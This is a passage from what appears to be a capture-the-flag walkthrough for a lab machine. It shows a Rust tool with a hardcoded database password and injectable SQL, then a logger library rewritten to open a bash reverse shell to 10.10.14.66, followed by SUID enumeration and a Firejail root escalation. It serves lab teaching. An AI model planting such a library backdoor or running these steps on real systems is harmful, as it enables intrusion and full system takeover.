+     MM    `7MM `7MMpdMAo. M YMb   M  .gP\&quot;Ya mmMMmm  
+     MM      MM   MM   `Wb M  `MN. M ,M&#x27;   Yb  MM    
+     MM      MM   MM    M8 M   `MM.M 8M\&quot;\&quot;\&quot;\&quot;\&quot;\&quot;  MM    
+     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
+   .JMML.  .JMML. MMbmmd&#x27;.JML.    YM  `Mbmmd&#x27;  `Mbmo 
+                  MM                                 
+                .JMML.                               
+
+&quot;);
+
+
+    let mode = get_mode();
+    
+    if mode == &quot;&quot; {
+	    return;
+    }
+    else if mode != &quot;upstream&quot; &amp;&amp; mode != &quot;pull&quot; {
+        println!(&quot;[-] Mode is still being ported to Rust; try again later.&quot;);
+        return;
+    }
+
+    let mut conn = connect_to_db(&quot;Upstream&quot;).unwrap();
+
+
+    if mode == &quot;pull&quot; {
+        let source = &quot;/var/www/html/SSA/SSA/submissions&quot;;
+        pull_indeces(&amp;mut conn, source);
+        println!(&quot;[+] Pull complete.&quot;);
+        return;
+    }
+
+    println!(&quot;Enter keywords to perform the query:&quot;);
+    let mut keywords = String::new();
+    io::stdin().read_line(&amp;mut keywords).unwrap();
+
+    if keywords.trim() == &quot;&quot; {
+        println!(&quot;[-] No keywords selected.\n\n[-] Quitting...\n&quot;);
+        return;
+    }
+
+    println!(&quot;Justification for the search:&quot;);
+    let mut justification = String::new();
+    io::stdin().read_line(&amp;mut justification).unwrap();
+
+    // Get Username 
+    let output = Command::new(&quot;/usr/bin/whoami&quot;)
+        .output()
+        .expect(&quot;nobody&quot;);
+
+    let username = String::from_utf8(output.stdout).unwrap();
+    let username = username.trim();
+
+    if justification.trim() == &quot;&quot; {
+        println!(&quot;[-] No justification provided. TipNet is under 702 authority; queries don&#x27;t need warrants, but need to be justified. This incident has been logged and will be reported.&quot;);
+        logger::log(username, keywords.as_str().trim(), &quot;Attempted to query TipNet without justification.&quot;);
+        return;
+    }
+
+    logger::log(username, keywords.as_str().trim(), justification.as_str());
+
+    search_sigint(&amp;mut conn, keywords.as_str().trim());
+
+}
+
+fn get_mode() -&gt; String {
+
+	let valid = false;
+	let mut mode = String::new();
+
+	while ! valid {
+		mode.clear();
+
+		println!(&quot;Select mode of usage:&quot;);
+		print!(&quot;a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n&quot;);
+
+		io::stdin().read_line(&amp;mut mode).unwrap();
+
+		match mode.trim() {
+			&quot;a&quot; =&gt; {
+			      println!(&quot;\n[+] Upstream selected&quot;);
+			      return &quot;upstream&quot;.to_string();
+			}
+			&quot;b&quot; =&gt; {
+			      println!(&quot;\n[+] Muscular selected&quot;);
+			      return &quot;regular&quot;.to_string();
+			}
+			&quot;c&quot; =&gt; {
+			      println!(&quot;\n[+] Tempora selected&quot;);
+			      return &quot;emperor&quot;.to_string();
+			}
+			&quot;d&quot; =&gt; {
+				println!(&quot;\n[+] PRISM selected&quot;);
+				return &quot;square&quot;.to_string();
+			}
+			&quot;e&quot; =&gt; {
+				println!(&quot;\n[!] Refreshing indeces!&quot;);
+				return &quot;pull&quot;.to_string();
+			}
+			&quot;q&quot; | &quot;Q&quot; =&gt; {
+				println!(&quot;\n[-] Quitting&quot;);
+				return &quot;&quot;.to_string();
+			}
+			_ =&gt; {
+				println!(&quot;\n[!] Invalid mode: {}&quot;, mode);
+			}
+		}
+	}
+	return mode;
+}
+
+fn connect_to_db(db: &amp;str) -&gt; Result&lt;mysql::PooledConn&gt; {
+    let url = &quot;mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream&quot;;
+    let pool = Pool::new(url).unwrap();
+    let mut conn = pool.get_conn().unwrap();
+    return Ok(conn);
+}
+
+fn search_sigint(conn: &amp;mut mysql::PooledConn, keywords: &amp;str) {
+    let keywords: Vec&lt;&amp;str&gt; = keywords.split(&quot; &quot;).collect();
+    let mut query = String::from(&quot;SELECT timestamp, target, source, data FROM SIGINT WHERE &quot;);
+
+    for (i, keyword) in keywords.iter().enumerate() {
+        if i &gt; 0 {
+            query.push_str(&quot;OR &quot;);
+        }
+        query.push_str(&amp;format!(&quot;data LIKE &#x27;%{}%&#x27; &quot;, keyword));
+    }
+    let selected_entries = conn.query_map(
+        query,
+        |(timestamp, target, source, data)| {
+            Entry { timestamp, target, source, data }
+        },
+        ).expect(&quot;Query failed.&quot;);
+    for e in selected_entries {
+        println!(&quot;[{}] {} ===&gt; {} | {}&quot;,
+                 e.timestamp, e.source, e.target, e.data);
+    }
+}
+
+fn pull_indeces(conn: &amp;mut mysql::PooledConn, directory: &amp;str) {
+    let paths = fs::read_dir(directory)
+        .unwrap()
+        .filter_map(|entry| entry.ok())
+        .filter(|entry| entry.path().extension().unwrap_or_default() == &quot;txt&quot;)
+        .map(|entry| entry.path());
+
+    let stmt_select = conn.prep(&quot;SELECT hash FROM tip_submissions WHERE hash = :hash&quot;)
+        .unwrap();
+    let stmt_insert = conn.prep(&quot;INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)&quot;)
+        .unwrap();
+
+    let now = Utc::now();
+
+    for path in paths {
+        let contents = fs::read_to_string(path).unwrap();
+        let hash = Sha256::digest(contents.as_bytes());
+        let hash_hex = hex::encode(hash);
+
+        let existing_entry: Option&lt;String&gt; = conn.exec_first(&amp;stmt_select, params! { &quot;hash&quot; =&gt; &amp;hash_hex }).unwrap();
+        if existing_entry.is_none() {
+            let date = now.format(&quot;%Y-%m-%d&quot;).to_string();
+            println!(&quot;[+] {}\n&quot;, contents);
+            conn.exec_drop(&amp;stmt_insert, params! {
+                &quot;timestamp&quot; =&gt; date,
+                &quot;data&quot; =&gt; contents,
+                &quot;hash&quot; =&gt; &amp;hash_hex,
+                },
+                ).unwrap();
+        }
+    }
+    logger::log(&quot;ROUTINE&quot;, &quot; - &quot;, &quot;Pulling fresh submissions into database.&quot;);
+
+}</code></pre><p id="9cbc3b51-ee7e-4f5f-8490-84aed720a6c3" class="">
+</p><p id="8e1321d2-9d6d-4ad6-96e4-87881d8edc18" class="">
+</p><p id="8bc4baa3-f803-46ae-aada-87a5904c6cfa" class="">We can access the logger package in </p><p id="dd11db11-31b3-43c6-be3e-dcf201a1fded" class=""><code>/opt/crates/logger/src/lib.rs</code></p><p id="a6df0d26-4288-408d-b9fa-2985c32ed084" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7bb2a4ff-476e-4f47-b6c0-17e91330be29" class="code"><code class="language-Rust">silentobserver@sandworm:/opt/crates/logger/src$ cat lib.rs 
+extern crate chrono;
+
+use std::fs::OpenOptions;
+use std::io::Write;
+use chrono::prelude::*;
+
+pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) {
+    let now = Local::now();
+    let timestamp = now.format(&quot;%Y-%m-%d %H:%M:%S&quot;).to_string();
+    let log_message = format!(&quot;[{}] - User: {}, Query: {}, Justification: {}\n&quot;, timestamp, user, query, justification);
+
+    let mut file = match OpenOptions::new().append(true).create(true).open(&quot;/opt/tipnet/access.log&quot;) {
+        Ok(file) =&gt; file,
+        Err(e) =&gt; {
+            println!(&quot;Error opening log file: {}&quot;, e);
+            return;
+        }
+    };
+
+    if let Err(e) = file.write_all(log_message.as_bytes()) {
+        println!(&quot;Error writing to log file: {}&quot;, e);
+    }
+}</code></pre><p id="c69ce43b-e819-493f-a76f-2c34ed92379b" class="">
+</p><p id="48e82b78-a008-4a9c-a1bb-e5e06a8780bd" class="">From there we can modify the file and have a revshell inside</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4588750b-a3ec-4f6b-835b-506ba387b574" class="code"><code class="language-Rust">extern crate chrono;
+
+use std::fs::OpenOptions;
+use std::io::Write;
+use chrono::prelude::*;
+use std::process::Command;
+
+pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) {
+    let command = &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.66/1337 0&gt;&amp;1&quot;;
+
+    let output = Command::new(&quot;bash&quot;)
+        .arg(&quot;-c&quot;)
+        .arg(command)
+        .output()
+        .expect(&quot;not work&quot;);
+
+    if output.status.success() {
+        let stdout = String::from_utf8_lossy(&amp;output.stdout);
+        let stderr = String::from_utf8_lossy(&amp;output.stderr);
+
+        println!(&quot;standar output: {}&quot;, stdout);
+        println!(&quot;error output: {}&quot;, stderr);
+    } else {
+        let stderr = String::from_utf8_lossy(&amp;output.stderr);
+        eprintln!(&quot;Error: {}&quot;, stderr);
+    }
+
+    let now = Local::now();
+    let timestamp = now.format(&quot;%Y-%m-%d %H:%M:%S&quot;).to_string();
+    let log_message = format!(&quot;[{}] - User: {}, Query: {}, Justification: {}\n&quot;, timestamp, user, query, justification);
+
+    let mut file = match OpenOptions::new().append(true).create(true).open(&quot;/opt/tipnet/access.log&quot;) {
+        Ok(file) =&gt; file,
+        Err(e) =&gt; {
+            println!(&quot;Error opening log file: {}&quot;, e);
+            return;
+        }
+    };
+
+    if let Err(e) = file.write_all(log_message.as_bytes()) {
+        println!(&quot;Error writing to log file: {}&quot;, e);
+    }
+}</code></pre><p id="d0bba89f-7e99-43b9-8aba-6864e1832cd2" class="">
+</p><p id="dc87f0ee-c793-4c2c-a7ff-d5c65280a577" class=""><mark class="highlight-pink">Created a lib.rs script in /tmp and moved it to the opt directory</mark></p><p id="a1d32100-457d-4f1e-aea3-74b8858dc27e" class="">
+</p><p id="8f81143f-1bc2-443e-bcba-75ba89e35939" class="">Start a nc listener and we have a rev shell</p><p id="13b10625-56ff-4ce2-89ab-d5f671b6cc3f" class="">we are now in the jailer group!</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="28357dd3-254f-4e56-bc79-b8da1f5d492e" class="code"><code class="language-Rust">atlas@sandworm:/opt/tipnet$ id
+id
+uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)</code></pre><p id="37055283-c2f4-47ff-9b8f-02b2a5d46ff5" class="">
+</p><p id="49f7c77a-ce5c-4494-8b5b-bc72512c0e7c" class="">
+</p><p id="fba98217-dff4-43f6-a8f6-225e3de2c6aa" class="">Find suid binaries</p><p id="23393409-4b4e-44a4-85b2-7310ff8e661a" class=""><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23e67f95-821a-4e05-8145-1aaa678b94c5" class="code"><code class="language-Rust">atlas@sandworm:/opt/tipnet$ find / -perm -u=s -type f 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+/opt/tipnet/target/debug/tipnet
+/opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
+/opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
+/usr/local/bin/firejail
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/fusermount3</code></pre><p id="7001be68-bfe6-44f5-964f-97762bbb8901" class="">
+</p><p id="f98c853a-ebd6-4dc2-baae-2d4b70de6d73" class="">And guid</p><p id="3394cd34-593d-43b1-aba2-6ce04be4bf82" class=""><code>find / -perm -g=s -type f 2&gt;/dev/null</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6432220c-d7e9-48a8-bca4-ac216692c1a8" class="code"><code class="language-Rust">atlas@sandworm:/opt/tipnet$ find / -perm -g=s -type f 2&gt;/dev/null
+find / -perm -g=s -type f 2&gt;/dev/null
+/usr/sbin/pam_extrausers_chkpwd
+/usr/sbin/unix_chkpwd
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/bin/wall
+/usr/bin/ssh-agent
+/usr/bin/expiry
+/usr/bin/chage
+/usr/bin/crontab
+/usr/bin/write.ul</code></pre><p id="455ec3a2-8fd6-488a-a091-fcf02e780f32" class="">
+</p><p id="6abc87e9-4315-465e-83a6-afdc45278e61" class="">List permissions </p><p id="9a90075e-1cd0-4390-be93-db31db6a3ea2" class=""><code>find / -perm -4000 -user root -exec ls -ld {} \; 2&gt;/dev/null</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="62849e38-b88d-4dc2-9ddb-d47a76b82185" class="code"><code class="language-Rust">atlas@sandworm:/opt/tipnet$ find / -perm -4000 -user root -exec ls -ld {} \; 2&gt;/dev/null
+&lt;erm -4000 -user root -exec ls -ld {} \; 2&gt;/dev/null
+-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 /usr/local/bin/firejail
+-rwsr-xr-- 1 root messagebus 35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 338536 Nov 23  2022 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 47480 Feb 21  2022 /usr/bin/mount
+-rwsr-xr-x 1 root root 232416 Apr  3 18:00 /usr/bin/sudo
+-rwsr-xr-x 1 root root 72072 Nov 24  2022 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 35192 Feb 21  2022 /usr/bin/umount
+-rwsr-xr-x 1 root root 59976 Nov 24  2022 /usr/bin/passwd
+-rwsr-xr-x 1 root root 44808 Nov 24  2022 /usr/bin/chsh
+-rwsr-xr-x 1 root root 72712 Nov 24  2022 /usr/bin/chfn
+-rwsr-xr-x 1 root root 40496 Nov 24  2022 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 55672 Feb 21  2022 /usr/bin/su
+-rwsr-xr-x 1 root root 35200 Mar 23  2022 /usr/bin/fusermount3</code></pre><p id="547e89db-1c50-40de-b4a4-b1e04b068bfa" class="">
+</p><p id="76da5e7e-0d3d-43b2-b8c8-25514247ce98" class="">Can we check on this:</p><p id="9991b22e-688b-4d22-8036-43f6574a81f7" class=""><code>/usr/local/bin/firejail</code></p><p id="4126e3af-7c2b-4415-b18a-2f507dfd3837" class="">
+</p><p id="f38db3ac-e34a-477f-b10e-873cd1403540" class="">There is an exploit that can get us root:</p><p id="5dd86d6b-6a0e-402c-9c9e-19804a8fb222" class="">Taken from here</p><figure id="54f6b3a6-119c-4d05-87a2-6ea52b9e2557"><a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Firejail suid bit priv esc - Exploit</div><div class="bookmark-description">Firejail suid bit priv esc - Exploit · GitHub</div></div><div class="bookmark-href"><img src="https://gist.github.com/favicon.ico" class="icon bookmark-icon"/>https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25</div></div><img src="https://github.githubassets.com/images/modules/gists/gist-og-image.png" class="bookmark-image"/></a></figure><p id="44c0870f-e835-4a88-bfa9-0b7a552447bf" class="">
+</p><p id="b8b9bd76-b2ae-44c6-8669-62fe17d2a24e" class="">On my own machine create a .py file, transfer it over to the target machine</p><p id="2c34c289-f472-4c5b-8f71-fded0c2eb76c" class="">
+</p><p id="1d50b178-22ef-4add-b051-767e91542531" class="">Once done, </p><p id="1f856292-559d-48e7-ae4d-5a765e466d2f" class=""><code>chmod +x exploit.py</code></p><p id="f0242b1d-3c9a-4cdf-a5b8-8bb47586e196" class="">
+</p><p id="d164d666-1563-4e25-9307-66555dd9b506" class="">Run the file:</p><p id="3dd6aab0-5801-4d17-8f7f-2fb894453751" class=""><code>python3 exploit.py</code></p><p id="c3a26002-7c2a-43d9-a380-7de17f826036" class="">
+</p><p id="35f4f918-4710-4942-b180-ac00fb6423dd" class="">We should see an output like this one below:</p><p id="fbbba18f-dbd0-450e-9740-1b5fa3ec5514" class=""><code>firejail --join=229526</code></p><p id="8e28f4ea-2017-4a97-b5cd-70455d1b56b8" class="">
+</p><p id="9fcb762d-0c0c-4f6a-ab5b-0b3da02e446f" class="">Once we run that command we can execute </p><p id="b4ad2064-3496-4f96-98ff-fb53af9fe79a" class=""><code>su -</code></p><p id="aaa989d1-c22e-4665-b0c3-5788025a21dd" class="">
+</p><p id="c84d09eb-3aec-4dc6-a684-a37ae8a3b36e" class="">And we are root and we can get the flag!</p><p id="f7f1ee94-ab3b-4c3c-8980-6bc9a80ae868" class=""><mark class="highlight-teal">root.txt: 44f973b0c84f3038c04f275aa5b4c848</mark></p><hr id="464d7c64-d9e7-417b-8477-6718019f3ec1"/><hr id="edc014da-55f2-4fe7-8240-04c556d38aa4"/><hr id="74bea9a3-f26b-4a7c-9dd9-8594ddcc2d25"/><hr id="d96ff8bf-5242-4dae-b8cd-84519de6dee4"/><p id="d8489d97-09fb-43ca-8e81-9b03941f2842" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
